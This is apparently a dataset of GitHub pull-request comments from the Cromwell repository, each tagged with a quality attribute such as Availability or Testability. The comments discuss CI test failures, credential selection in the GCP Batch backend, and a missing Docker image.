https://github.com/broadinstitute/cromwell/pull/7177#issuecomment-1641142966:382,Availability,avail,available,382,"Known issues:. ---. 1. The `Centaur GCP Batch` [test](https://github.com/broadinstitute/cromwell/actions/runs/5590808626/jobs/10221029126?pr=7177) is unexpectedly trying to use Application Default Credentials when it should be using the service account `cromwell@broad-dsde-cromwell-dev.iam.gserviceaccount.com`. ```; The Application Default Credentials are not available. They are available if running in Google Compute Engine.; ```. The SA should be available as evidenced by the following output near the top of the log, so it looks like an issue with selecting the right credentials. In other words, I think this is an application logic issue in GCP Batch rather than an environment problem. (Cromwell uses service account auth for everything but local development.); ```; Activated service account credentials for: [cromwell@broad-dsde-cromwell-dev.iam.gserviceaccount.com]; ```. Plausibly responsible party to fix: Burwood. ---. 2. DRS-related failures in [Centaur Horicromtal PapiV2 Beta](https://github.com/broadinstitute/cromwell/actions/runs/5590808626/jobs/10221030693?pr=7177#logs) seem to be the downstream of not being able to build/push the `cromwell-drs-localizer` image. Example error below; images should appear [in the GCR for `broad-dsde-cromwell-dev`](https://console.cloud.google.com/gcr/images/broad-dsde-cromwell-dev/global/cromwell-drs-localizer?project=broad-dsde-cromwell-dev) and the named one does not exist. ```; Error response from daemon:; manifest for gcr.io/broad-dsde-cromwell-dev/cromwell-drs-localizer:github-5590808626 not found; ```. I've replicated the inability to build locally, including on `develop`, and am iterating in this PR: https://github.com/broadinstitute/cromwell/pull/7179. Plausibly responsible party to fix: Broad. ---. 3. Unit tests are [failing](https://github.com/broadinstitute/cromwell/actions/runs/5590808615/jobs/10221028981?pr=7177) because an assertion is looking for different paths in some cases. Examples:. ```; GcpBatchFileInput(""wf",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7177#issuecomment-1641142966
https://github.com/broadinstitute/cromwell/pull/7177#issuecomment-1641142966:452,Availability,avail,available,452,"Known issues:. ---. 1. The `Centaur GCP Batch` [test](https://github.com/broadinstitute/cromwell/actions/runs/5590808626/jobs/10221029126?pr=7177) is unexpectedly trying to use Application Default Credentials when it should be using the service account `cromwell@broad-dsde-cromwell-dev.iam.gserviceaccount.com`. ```; The Application Default Credentials are not available. They are available if running in Google Compute Engine.; ```. The SA should be available as evidenced by the following output near the top of the log, so it looks like an issue with selecting the right credentials. In other words, I think this is an application logic issue in GCP Batch rather than an environment problem. (Cromwell uses service account auth for everything but local development.); ```; Activated service account credentials for: [cromwell@broad-dsde-cromwell-dev.iam.gserviceaccount.com]; ```. Plausibly responsible party to fix: Burwood. ---. 2. DRS-related failures in [Centaur Horicromtal PapiV2 Beta](https://github.com/broadinstitute/cromwell/actions/runs/5590808626/jobs/10221030693?pr=7177#logs) seem to be the downstream of not being able to build/push the `cromwell-drs-localizer` image. Example error below; images should appear [in the GCR for `broad-dsde-cromwell-dev`](https://console.cloud.google.com/gcr/images/broad-dsde-cromwell-dev/global/cromwell-drs-localizer?project=broad-dsde-cromwell-dev) and the named one does not exist. ```; Error response from daemon:; manifest for gcr.io/broad-dsde-cromwell-dev/cromwell-drs-localizer:github-5590808626 not found; ```. I've replicated the inability to build locally, including on `develop`, and am iterating in this PR: https://github.com/broadinstitute/cromwell/pull/7179. Plausibly responsible party to fix: Broad. ---. 3. Unit tests are [failing](https://github.com/broadinstitute/cromwell/actions/runs/5590808615/jobs/10221028981?pr=7177) because an assertion is looking for different paths in some cases. Examples:. ```; GcpBatchFileInput(""wf",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7177#issuecomment-1641142966
https://github.com/broadinstitute/cromwell/pull/7177#issuecomment-1641142966:950,Availability,failure,failures,950,"Known issues:. ---. 1. The `Centaur GCP Batch` [test](https://github.com/broadinstitute/cromwell/actions/runs/5590808626/jobs/10221029126?pr=7177) is unexpectedly trying to use Application Default Credentials when it should be using the service account `cromwell@broad-dsde-cromwell-dev.iam.gserviceaccount.com`. ```; The Application Default Credentials are not available. They are available if running in Google Compute Engine.; ```. The SA should be available as evidenced by the following output near the top of the log, so it looks like an issue with selecting the right credentials. In other words, I think this is an application logic issue in GCP Batch rather than an environment problem. (Cromwell uses service account auth for everything but local development.); ```; Activated service account credentials for: [cromwell@broad-dsde-cromwell-dev.iam.gserviceaccount.com]; ```. Plausibly responsible party to fix: Burwood. ---. 2. DRS-related failures in [Centaur Horicromtal PapiV2 Beta](https://github.com/broadinstitute/cromwell/actions/runs/5590808626/jobs/10221030693?pr=7177#logs) seem to be the downstream of not being able to build/push the `cromwell-drs-localizer` image. Example error below; images should appear [in the GCR for `broad-dsde-cromwell-dev`](https://console.cloud.google.com/gcr/images/broad-dsde-cromwell-dev/global/cromwell-drs-localizer?project=broad-dsde-cromwell-dev) and the named one does not exist. ```; Error response from daemon:; manifest for gcr.io/broad-dsde-cromwell-dev/cromwell-drs-localizer:github-5590808626 not found; ```. I've replicated the inability to build locally, including on `develop`, and am iterating in this PR: https://github.com/broadinstitute/cromwell/pull/7179. Plausibly responsible party to fix: Broad. ---. 3. Unit tests are [failing](https://github.com/broadinstitute/cromwell/actions/runs/5590808615/jobs/10221028981?pr=7177) because an assertion is looking for different paths in some cases. Examples:. ```; GcpBatchFileInput(""wf",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7177#issuecomment-1641142966
https://github.com/broadinstitute/cromwell/pull/7177#issuecomment-1641142966:1109,Availability,down,downstream,1109,"tions/runs/5590808626/jobs/10221029126?pr=7177) is unexpectedly trying to use Application Default Credentials when it should be using the service account `cromwell@broad-dsde-cromwell-dev.iam.gserviceaccount.com`. ```; The Application Default Credentials are not available. They are available if running in Google Compute Engine.; ```. The SA should be available as evidenced by the following output near the top of the log, so it looks like an issue with selecting the right credentials. In other words, I think this is an application logic issue in GCP Batch rather than an environment problem. (Cromwell uses service account auth for everything but local development.); ```; Activated service account credentials for: [cromwell@broad-dsde-cromwell-dev.iam.gserviceaccount.com]; ```. Plausibly responsible party to fix: Burwood. ---. 2. DRS-related failures in [Centaur Horicromtal PapiV2 Beta](https://github.com/broadinstitute/cromwell/actions/runs/5590808626/jobs/10221030693?pr=7177#logs) seem to be the downstream of not being able to build/push the `cromwell-drs-localizer` image. Example error below; images should appear [in the GCR for `broad-dsde-cromwell-dev`](https://console.cloud.google.com/gcr/images/broad-dsde-cromwell-dev/global/cromwell-drs-localizer?project=broad-dsde-cromwell-dev) and the named one does not exist. ```; Error response from daemon:; manifest for gcr.io/broad-dsde-cromwell-dev/cromwell-drs-localizer:github-5590808626 not found; ```. I've replicated the inability to build locally, including on `develop`, and am iterating in this PR: https://github.com/broadinstitute/cromwell/pull/7179. Plausibly responsible party to fix: Broad. ---. 3. Unit tests are [failing](https://github.com/broadinstitute/cromwell/actions/runs/5590808615/jobs/10221028981?pr=7177) because an assertion is looking for different paths in some cases. Examples:. ```; GcpBatchFileInput(""wf_whereami.whereami.stringToFileMap-0"", gs://path/to/stringTofile1, path/to/stringTofile1, local-di",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7177#issuecomment-1641142966
https://github.com/broadinstitute/cromwell/pull/7177#issuecomment-1641142966:1196,Availability,error,error,1196,"ervice account `cromwell@broad-dsde-cromwell-dev.iam.gserviceaccount.com`. ```; The Application Default Credentials are not available. They are available if running in Google Compute Engine.; ```. The SA should be available as evidenced by the following output near the top of the log, so it looks like an issue with selecting the right credentials. In other words, I think this is an application logic issue in GCP Batch rather than an environment problem. (Cromwell uses service account auth for everything but local development.); ```; Activated service account credentials for: [cromwell@broad-dsde-cromwell-dev.iam.gserviceaccount.com]; ```. Plausibly responsible party to fix: Burwood. ---. 2. DRS-related failures in [Centaur Horicromtal PapiV2 Beta](https://github.com/broadinstitute/cromwell/actions/runs/5590808626/jobs/10221030693?pr=7177#logs) seem to be the downstream of not being able to build/push the `cromwell-drs-localizer` image. Example error below; images should appear [in the GCR for `broad-dsde-cromwell-dev`](https://console.cloud.google.com/gcr/images/broad-dsde-cromwell-dev/global/cromwell-drs-localizer?project=broad-dsde-cromwell-dev) and the named one does not exist. ```; Error response from daemon:; manifest for gcr.io/broad-dsde-cromwell-dev/cromwell-drs-localizer:github-5590808626 not found; ```. I've replicated the inability to build locally, including on `develop`, and am iterating in this PR: https://github.com/broadinstitute/cromwell/pull/7179. Plausibly responsible party to fix: Broad. ---. 3. Unit tests are [failing](https://github.com/broadinstitute/cromwell/actions/runs/5590808615/jobs/10221028981?pr=7177) because an assertion is looking for different paths in some cases. Examples:. ```; GcpBatchFileInput(""wf_whereami.whereami.stringToFileMap-0"", gs://path/to/stringTofile1, path/to/stringTofile1, local-disk 200 SSD); ```; where the relevant element present is; ```; GcpBatchFileInput(""stringToFileMap"", gs://path/to/stringTofile1, path/to/stri",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7177#issuecomment-1641142966
https://github.com/broadinstitute/cromwell/pull/7177#issuecomment-1641142966:1443,Availability,Error,Error,1443,"s evidenced by the following output near the top of the log, so it looks like an issue with selecting the right credentials. In other words, I think this is an application logic issue in GCP Batch rather than an environment problem. (Cromwell uses service account auth for everything but local development.); ```; Activated service account credentials for: [cromwell@broad-dsde-cromwell-dev.iam.gserviceaccount.com]; ```. Plausibly responsible party to fix: Burwood. ---. 2. DRS-related failures in [Centaur Horicromtal PapiV2 Beta](https://github.com/broadinstitute/cromwell/actions/runs/5590808626/jobs/10221030693?pr=7177#logs) seem to be the downstream of not being able to build/push the `cromwell-drs-localizer` image. Example error below; images should appear [in the GCR for `broad-dsde-cromwell-dev`](https://console.cloud.google.com/gcr/images/broad-dsde-cromwell-dev/global/cromwell-drs-localizer?project=broad-dsde-cromwell-dev) and the named one does not exist. ```; Error response from daemon:; manifest for gcr.io/broad-dsde-cromwell-dev/cromwell-drs-localizer:github-5590808626 not found; ```. I've replicated the inability to build locally, including on `develop`, and am iterating in this PR: https://github.com/broadinstitute/cromwell/pull/7179. Plausibly responsible party to fix: Broad. ---. 3. Unit tests are [failing](https://github.com/broadinstitute/cromwell/actions/runs/5590808615/jobs/10221028981?pr=7177) because an assertion is looking for different paths in some cases. Examples:. ```; GcpBatchFileInput(""wf_whereami.whereami.stringToFileMap-0"", gs://path/to/stringTofile1, path/to/stringTofile1, local-disk 200 SSD); ```; where the relevant element present is; ```; GcpBatchFileInput(""stringToFileMap"", gs://path/to/stringTofile1, path/to/stringTofile1, local-disk 200 SSD); ```; as well as; ```; List(""/mnt/read/only/container:/mnt/read/only/container:""); ```; versus; ```; List(""/mnt/read/only/container:/mnt/read/only/container""); ```. Plausibly responsible party t",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7177#issuecomment-1641142966
https://github.com/broadinstitute/cromwell/pull/7177#issuecomment-1641142966:48,Testability,test,test,48,"Known issues:. ---. 1. The `Centaur GCP Batch` [test](https://github.com/broadinstitute/cromwell/actions/runs/5590808626/jobs/10221029126?pr=7177) is unexpectedly trying to use Application Default Credentials when it should be using the service account `cromwell@broad-dsde-cromwell-dev.iam.gserviceaccount.com`. ```; The Application Default Credentials are not available. They are available if running in Google Compute Engine.; ```. The SA should be available as evidenced by the following output near the top of the log, so it looks like an issue with selecting the right credentials. In other words, I think this is an application logic issue in GCP Batch rather than an environment problem. (Cromwell uses service account auth for everything but local development.); ```; Activated service account credentials for: [cromwell@broad-dsde-cromwell-dev.iam.gserviceaccount.com]; ```. Plausibly responsible party to fix: Burwood. ---. 2. DRS-related failures in [Centaur Horicromtal PapiV2 Beta](https://github.com/broadinstitute/cromwell/actions/runs/5590808626/jobs/10221030693?pr=7177#logs) seem to be the downstream of not being able to build/push the `cromwell-drs-localizer` image. Example error below; images should appear [in the GCR for `broad-dsde-cromwell-dev`](https://console.cloud.google.com/gcr/images/broad-dsde-cromwell-dev/global/cromwell-drs-localizer?project=broad-dsde-cromwell-dev) and the named one does not exist. ```; Error response from daemon:; manifest for gcr.io/broad-dsde-cromwell-dev/cromwell-drs-localizer:github-5590808626 not found; ```. I've replicated the inability to build locally, including on `develop`, and am iterating in this PR: https://github.com/broadinstitute/cromwell/pull/7179. Plausibly responsible party to fix: Broad. ---. 3. Unit tests are [failing](https://github.com/broadinstitute/cromwell/actions/runs/5590808615/jobs/10221028981?pr=7177) because an assertion is looking for different paths in some cases. Examples:. ```; GcpBatchFileInput(""wf",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7177#issuecomment-1641142966
https://github.com/broadinstitute/cromwell/pull/7177#issuecomment-1641142966:519,Testability,log,log,519,"Known issues:. ---. 1. The `Centaur GCP Batch` [test](https://github.com/broadinstitute/cromwell/actions/runs/5590808626/jobs/10221029126?pr=7177) is unexpectedly trying to use Application Default Credentials when it should be using the service account `cromwell@broad-dsde-cromwell-dev.iam.gserviceaccount.com`. ```; The Application Default Credentials are not available. They are available if running in Google Compute Engine.; ```. The SA should be available as evidenced by the following output near the top of the log, so it looks like an issue with selecting the right credentials. In other words, I think this is an application logic issue in GCP Batch rather than an environment problem. (Cromwell uses service account auth for everything but local development.); ```; Activated service account credentials for: [cromwell@broad-dsde-cromwell-dev.iam.gserviceaccount.com]; ```. Plausibly responsible party to fix: Burwood. ---. 2. DRS-related failures in [Centaur Horicromtal PapiV2 Beta](https://github.com/broadinstitute/cromwell/actions/runs/5590808626/jobs/10221030693?pr=7177#logs) seem to be the downstream of not being able to build/push the `cromwell-drs-localizer` image. Example error below; images should appear [in the GCR for `broad-dsde-cromwell-dev`](https://console.cloud.google.com/gcr/images/broad-dsde-cromwell-dev/global/cromwell-drs-localizer?project=broad-dsde-cromwell-dev) and the named one does not exist. ```; Error response from daemon:; manifest for gcr.io/broad-dsde-cromwell-dev/cromwell-drs-localizer:github-5590808626 not found; ```. I've replicated the inability to build locally, including on `develop`, and am iterating in this PR: https://github.com/broadinstitute/cromwell/pull/7179. Plausibly responsible party to fix: Broad. ---. 3. Unit tests are [failing](https://github.com/broadinstitute/cromwell/actions/runs/5590808615/jobs/10221028981?pr=7177) because an assertion is looking for different paths in some cases. Examples:. ```; GcpBatchFileInput(""wf",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7177#issuecomment-1641142966
https://github.com/broadinstitute/cromwell/pull/7177#issuecomment-1641142966:635,Testability,log,logic,635,"Known issues:. ---. 1. The `Centaur GCP Batch` [test](https://github.com/broadinstitute/cromwell/actions/runs/5590808626/jobs/10221029126?pr=7177) is unexpectedly trying to use Application Default Credentials when it should be using the service account `cromwell@broad-dsde-cromwell-dev.iam.gserviceaccount.com`. ```; The Application Default Credentials are not available. They are available if running in Google Compute Engine.; ```. The SA should be available as evidenced by the following output near the top of the log, so it looks like an issue with selecting the right credentials. In other words, I think this is an application logic issue in GCP Batch rather than an environment problem. (Cromwell uses service account auth for everything but local development.); ```; Activated service account credentials for: [cromwell@broad-dsde-cromwell-dev.iam.gserviceaccount.com]; ```. Plausibly responsible party to fix: Burwood. ---. 2. DRS-related failures in [Centaur Horicromtal PapiV2 Beta](https://github.com/broadinstitute/cromwell/actions/runs/5590808626/jobs/10221030693?pr=7177#logs) seem to be the downstream of not being able to build/push the `cromwell-drs-localizer` image. Example error below; images should appear [in the GCR for `broad-dsde-cromwell-dev`](https://console.cloud.google.com/gcr/images/broad-dsde-cromwell-dev/global/cromwell-drs-localizer?project=broad-dsde-cromwell-dev) and the named one does not exist. ```; Error response from daemon:; manifest for gcr.io/broad-dsde-cromwell-dev/cromwell-drs-localizer:github-5590808626 not found; ```. I've replicated the inability to build locally, including on `develop`, and am iterating in this PR: https://github.com/broadinstitute/cromwell/pull/7179. Plausibly responsible party to fix: Broad. ---. 3. Unit tests are [failing](https://github.com/broadinstitute/cromwell/actions/runs/5590808615/jobs/10221028981?pr=7177) because an assertion is looking for different paths in some cases. Examples:. ```; GcpBatchFileInput(""wf",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7177#issuecomment-1641142966
https://github.com/broadinstitute/cromwell/pull/7177#issuecomment-1641142966:1088,Testability,log,logs,1088,"tions/runs/5590808626/jobs/10221029126?pr=7177) is unexpectedly trying to use Application Default Credentials when it should be using the service account `cromwell@broad-dsde-cromwell-dev.iam.gserviceaccount.com`. ```; The Application Default Credentials are not available. They are available if running in Google Compute Engine.; ```. The SA should be available as evidenced by the following output near the top of the log, so it looks like an issue with selecting the right credentials. In other words, I think this is an application logic issue in GCP Batch rather than an environment problem. (Cromwell uses service account auth for everything but local development.); ```; Activated service account credentials for: [cromwell@broad-dsde-cromwell-dev.iam.gserviceaccount.com]; ```. Plausibly responsible party to fix: Burwood. ---. 2. DRS-related failures in [Centaur Horicromtal PapiV2 Beta](https://github.com/broadinstitute/cromwell/actions/runs/5590808626/jobs/10221030693?pr=7177#logs) seem to be the downstream of not being able to build/push the `cromwell-drs-localizer` image. Example error below; images should appear [in the GCR for `broad-dsde-cromwell-dev`](https://console.cloud.google.com/gcr/images/broad-dsde-cromwell-dev/global/cromwell-drs-localizer?project=broad-dsde-cromwell-dev) and the named one does not exist. ```; Error response from daemon:; manifest for gcr.io/broad-dsde-cromwell-dev/cromwell-drs-localizer:github-5590808626 not found; ```. I've replicated the inability to build locally, including on `develop`, and am iterating in this PR: https://github.com/broadinstitute/cromwell/pull/7179. Plausibly responsible party to fix: Broad. ---. 3. Unit tests are [failing](https://github.com/broadinstitute/cromwell/actions/runs/5590808615/jobs/10221028981?pr=7177) because an assertion is looking for different paths in some cases. Examples:. ```; GcpBatchFileInput(""wf_whereami.whereami.stringToFileMap-0"", gs://path/to/stringTofile1, path/to/stringTofile1, local-di",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7177#issuecomment-1641142966
https://github.com/broadinstitute/cromwell/pull/7177#issuecomment-1641142966:1784,Testability,test,tests,1784," the following output near the top of the log, so it looks like an issue with selecting the right credentials. In other words, I think this is an application logic issue in GCP Batch rather than an environment problem. (Cromwell uses service account auth for everything but local development.); ```; Activated service account credentials for: [cromwell@broad-dsde-cromwell-dev.iam.gserviceaccount.com]; ```. Plausibly responsible party to fix: Burwood. ---. 2. DRS-related failures in [Centaur Horicromtal PapiV2 Beta](https://github.com/broadinstitute/cromwell/actions/runs/5590808626/jobs/10221030693?pr=7177#logs) seem to be the downstream of not being able to build/push the `cromwell-drs-localizer` image. Example error below; images should appear [in the GCR for `broad-dsde-cromwell-dev`](https://console.cloud.google.com/gcr/images/broad-dsde-cromwell-dev/global/cromwell-drs-localizer?project=broad-dsde-cromwell-dev) and the named one does not exist. ```; Error response from daemon:; manifest for gcr.io/broad-dsde-cromwell-dev/cromwell-drs-localizer:github-5590808626 not found; ```. I've replicated the inability to build locally, including on `develop`, and am iterating in this PR: https://github.com/broadinstitute/cromwell/pull/7179. Plausibly responsible party to fix: Broad. ---. 3. Unit tests are [failing](https://github.com/broadinstitute/cromwell/actions/runs/5590808615/jobs/10221028981?pr=7177) because an assertion is looking for different paths in some cases. Examples:. ```; GcpBatchFileInput(""wf_whereami.whereami.stringToFileMap-0"", gs://path/to/stringTofile1, path/to/stringTofile1, local-disk 200 SSD); ```; where the relevant element present is; ```; GcpBatchFileInput(""stringToFileMap"", gs://path/to/stringTofile1, path/to/stringTofile1, local-disk 200 SSD); ```; as well as; ```; List(""/mnt/read/only/container:/mnt/read/only/container:""); ```; versus; ```; List(""/mnt/read/only/container:/mnt/read/only/container""); ```. Plausibly responsible party to fix: Burwood",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7177#issuecomment-1641142966
https://github.com/broadinstitute/cromwell/pull/7177#issuecomment-1641142966:1908,Testability,assert,assertion,1908," the following output near the top of the log, so it looks like an issue with selecting the right credentials. In other words, I think this is an application logic issue in GCP Batch rather than an environment problem. (Cromwell uses service account auth for everything but local development.); ```; Activated service account credentials for: [cromwell@broad-dsde-cromwell-dev.iam.gserviceaccount.com]; ```. Plausibly responsible party to fix: Burwood. ---. 2. DRS-related failures in [Centaur Horicromtal PapiV2 Beta](https://github.com/broadinstitute/cromwell/actions/runs/5590808626/jobs/10221030693?pr=7177#logs) seem to be the downstream of not being able to build/push the `cromwell-drs-localizer` image. Example error below; images should appear [in the GCR for `broad-dsde-cromwell-dev`](https://console.cloud.google.com/gcr/images/broad-dsde-cromwell-dev/global/cromwell-drs-localizer?project=broad-dsde-cromwell-dev) and the named one does not exist. ```; Error response from daemon:; manifest for gcr.io/broad-dsde-cromwell-dev/cromwell-drs-localizer:github-5590808626 not found; ```. I've replicated the inability to build locally, including on `develop`, and am iterating in this PR: https://github.com/broadinstitute/cromwell/pull/7179. Plausibly responsible party to fix: Broad. ---. 3. Unit tests are [failing](https://github.com/broadinstitute/cromwell/actions/runs/5590808615/jobs/10221028981?pr=7177) because an assertion is looking for different paths in some cases. Examples:. ```; GcpBatchFileInput(""wf_whereami.whereami.stringToFileMap-0"", gs://path/to/stringTofile1, path/to/stringTofile1, local-disk 200 SSD); ```; where the relevant element present is; ```; GcpBatchFileInput(""stringToFileMap"", gs://path/to/stringTofile1, path/to/stringTofile1, local-disk 200 SSD); ```; as well as; ```; List(""/mnt/read/only/container:/mnt/read/only/container:""); ```; versus; ```; List(""/mnt/read/only/container:/mnt/read/only/container""); ```. Plausibly responsible party to fix: Burwood",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7177#issuecomment-1641142966
https://github.com/broadinstitute/cromwell/pull/7177#issuecomment-1644510515:105,Deployability,update,updated,105,I merged the DRS stability PR https://github.com/broadinstitute/cromwell/pull/7179 to `develop` and then updated this branch from it.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7177#issuecomment-1644510515
https://github.com/broadinstitute/cromwell/pull/7177#issuecomment-1648047643:147,Integrability,message,message,147,Google Auth is handled by Cromwell cloud support. Not the supported backend it appears. @aednichols - how is the service account provided? The log message is not clear. https://github.com/broadinstitute/cromwell/blob/develop/cloudSupport/src/main/scala/cromwell/cloudsupport/gcp/auth/GoogleAuthMode.scala,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7177#issuecomment-1648047643
https://github.com/broadinstitute/cromwell/pull/7177#issuecomment-1648047643:143,Testability,log,log,143,Google Auth is handled by Cromwell cloud support. Not the supported backend it appears. @aednichols - how is the service account provided? The log message is not clear. https://github.com/broadinstitute/cromwell/blob/develop/cloudSupport/src/main/scala/cromwell/cloudsupport/gcp/auth/GoogleAuthMode.scala,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7177#issuecomment-1648047643
https://github.com/broadinstitute/cromwell/pull/7177#issuecomment-1648047643:162,Usability,clear,clear,162,Google Auth is handled by Cromwell cloud support. Not the supported backend it appears. @aednichols - how is the service account provided? The log message is not clear. https://github.com/broadinstitute/cromwell/blob/develop/cloudSupport/src/main/scala/cromwell/cloudsupport/gcp/auth/GoogleAuthMode.scala,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7177#issuecomment-1648047643
https://github.com/broadinstitute/cromwell/pull/7177#issuecomment-1648503806:154,Modifiability,config,config,154,"It looks like that class defines all of the possible variations, but doesn't actually choose one for you. That must happen somewhere in code that reads a config and instantiates the appropriate variation. I think the most likely source of the issue is config parsing specific to the backend, or a bad config itself.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7177#issuecomment-1648503806
https://github.com/broadinstitute/cromwell/pull/7177#issuecomment-1648503806:252,Modifiability,config,config,252,"It looks like that class defines all of the possible variations, but doesn't actually choose one for you. That must happen somewhere in code that reads a config and instantiates the appropriate variation. I think the most likely source of the issue is config parsing specific to the backend, or a bad config itself.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7177#issuecomment-1648503806
https://github.com/broadinstitute/cromwell/pull/7177#issuecomment-1648503806:301,Modifiability,config,config,301,"It looks like that class defines all of the possible variations, but doesn't actually choose one for you. That must happen somewhere in code that reads a config and instantiates the appropriate variation. I think the most likely source of the issue is config parsing specific to the backend, or a bad config itself.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7177#issuecomment-1648503806
https://github.com/broadinstitute/cromwell/pull/7178#issuecomment-1651859912:131,Performance,load,loaded,131,"Looking into the failing unit test here, which is passing for me locally. It looks like non-default NIO filesystems aren't getting loaded in the github action test run, though they are locally.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7178#issuecomment-1651859912
https://github.com/broadinstitute/cromwell/pull/7178#issuecomment-1651859912:30,Testability,test,test,30,"Looking into the failing unit test here, which is passing for me locally. It looks like non-default NIO filesystems aren't getting loaded in the github action test run, though they are locally.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7178#issuecomment-1651859912
https://github.com/broadinstitute/cromwell/pull/7178#issuecomment-1651859912:159,Testability,test,test,159,"Looking into the failing unit test here, which is passing for me locally. It looks like non-default NIO filesystems aren't getting loaded in the github action test run, though they are locally.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7178#issuecomment-1651859912
https://github.com/broadinstitute/cromwell/pull/7178#issuecomment-1680785022:17,Modifiability,config,config,17,"Hm, why was that config added back in? Those fields aren't used anymore, are they?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7178#issuecomment-1680785022
https://github.com/broadinstitute/cromwell/pull/7178#issuecomment-1683875151:37,Deployability,update,updated,37,"Code looks good, it just needs to be updated with the latest state for `develop`. I think Adam's updates should solve the issues Christian had regarding testing his changes in CI.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7178#issuecomment-1683875151
https://github.com/broadinstitute/cromwell/pull/7178#issuecomment-1683875151:97,Deployability,update,updates,97,"Code looks good, it just needs to be updated with the latest state for `develop`. I think Adam's updates should solve the issues Christian had regarding testing his changes in CI.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7178#issuecomment-1683875151
https://github.com/broadinstitute/cromwell/pull/7178#issuecomment-1683875151:153,Testability,test,testing,153,"Code looks good, it just needs to be updated with the latest state for `develop`. I think Adam's updates should solve the issues Christian had regarding testing his changes in CI.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7178#issuecomment-1683875151
https://github.com/broadinstitute/cromwell/pull/7178#issuecomment-1687168722:10,Availability,failure,failure,10,Unit test failure was `WorkflowOutputsSpec` which is a known flake (should fix). Restarted.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7178#issuecomment-1687168722
https://github.com/broadinstitute/cromwell/pull/7178#issuecomment-1687168722:5,Testability,test,test,5,Unit test failure was `WorkflowOutputsSpec` which is a known flake (should fix). Restarted.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7178#issuecomment-1687168722
